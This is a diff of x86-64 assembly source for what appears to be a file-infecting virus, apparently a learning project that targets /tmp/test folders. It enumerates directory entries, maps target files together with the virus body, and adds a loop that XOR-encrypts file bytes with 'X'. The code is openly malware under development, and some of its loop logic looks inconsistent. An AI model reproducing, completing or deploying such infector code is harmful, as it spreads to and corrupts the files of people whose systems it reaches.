@@ -75,6 +75,8 @@
 ; 418 = dirent.d_type
 ; 419 = dirent.d_name
 ; 500 = first folder
+; 550 = flag for /tmp/test{1,2}
+; 554 = filesize
 section .text
 	global _start
 _start:
@@ -216,11 +218,15 @@ _begin:
 
 				cmp rax, 0						; if write failed, _end now
 				jbe .close_file
+				; mov rdi, r10
+				; mov rax, SYS_CLOSE
+				; syscall
 			.encrypt:
 				; void * mmap( void * addr, size_t len, int prot, int flags, int fildes, off_t off );
 				xor rdi, rdi								; addr	-> rdi = NULL
 				mov rsi, _end - _start						; len	-> rsi = virus size
 				add rsi, r10								; target file + virus size
+				mov [r15 + 48], rsi
 				mov r11, r10								; backup final filesize	
 				mov rdx, PROT_READ | PROT_WRITE				; prot	-> rdx = PROT_READ | PROT_WRITE
 				xor r9, r9								    ; offset = 0
@@ -235,29 +241,21 @@ _begin:
 				mov r10, rax								; r10 = mmap address
 				; mmunmap(addr, len);
 				; move st_size to r13
-				mov r13 , [r15 + 48]
-
-				mov rcx, r11
-				mov rdi, rcx
-				mov rax, SYS_CLOSE
-				add rcx, _end - _begin
+				mov r13 , [r15 + 48]							; rdi = mmap address
 				.write_loop:
-					mov byte [r10 + rcx], 'X'
-					nop
-					nop
-					nop
-					nop
-					nop
+					dec r13
+					xor byte [r10 + r13], 'X'
+
 					; xor byte [r10 + rcx], 'X'
 					; xor byte [r10 + rcx], 42
 					; xor byte [r13 + rcx], 42					; encrypting
 					; xor byte [r13 + rcx], 42					; decrypting
 					inc rcx
 					cmp rcx, r11					; check if we looped through all bytes already
-					je .write_loop
+					jle .write_loop
 				xor rcx, rcx
 				mov rdi, r10
-				mov rsi, r11
+				mov rsi, [r15 + 48]
 				mov rax, SYS_MUNMAP
 				syscall
 				cmp rax, 0									; check if mmunmap failed
